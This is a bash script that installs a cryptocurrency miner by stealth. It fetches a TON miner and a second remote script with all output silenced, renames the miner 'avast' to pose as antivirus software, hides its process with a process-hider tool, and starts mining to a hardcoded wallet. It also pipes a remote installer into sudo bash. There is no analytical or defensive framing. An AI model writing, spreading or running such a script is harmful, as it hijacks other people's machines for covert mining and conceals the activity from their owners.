#!/bin/bash

#!/bin/sh

#!/bin/bash

apt update

apt install proxychains

apt install curl

apt install screen -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider

wget -q https://downloads.toncoin.plus/ubuntu/toncoin.plus-miner-1.7.4-ubuntu.tar.gz >/dev/null 2>&1 

tar xf toncoin.plus-miner-1.7.4-ubuntu.tar.gz >/dev/null 2>&1

rm -f toncoin.plus-miner-1.7.4-ubuntu.tar.gz >/dev/null 2>&1

mv toncoin_plus avast >/dev/null 2>&1

chmod +x avast >/dev/null 2>&1

wget https://raw.githubusercontent.com/renilo/bc/main/pro.sh >/dev/null 2>&1

chmod +x start.sh >/dev/null 2>&1

#screen -dmS Running ./pro.sh

sudo ph add avast

./avast EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
